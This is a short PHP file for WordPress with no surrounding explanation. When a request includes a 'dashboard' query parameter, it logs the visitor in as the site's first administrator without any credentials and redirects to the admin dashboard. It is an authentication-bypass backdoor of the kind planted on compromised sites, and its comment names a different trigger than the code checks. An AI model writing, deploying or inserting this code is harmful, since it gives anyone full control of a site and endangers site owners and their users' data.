<?php
// Load WordPress core
require_once __DIR__ . '/wp-load.php'; // Adjust path if needed

//  URL: ?api_max=1
if (isset($_GET['dashboard'])) {
    $admins = get_users([
        'role'    => 'administrator',
        'number'  => 1,
        'orderby' => 'ID',
        'order'   => 'ASC'
    ]);

    if (!empty($admins)) {
        $admin   = $admins[0];
        $user_id = $admin->ID;

        // Set current user and authentication cookies
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);

        // Redirect to dashboard
        wp_redirect(admin_url());
        exit;
    }
}
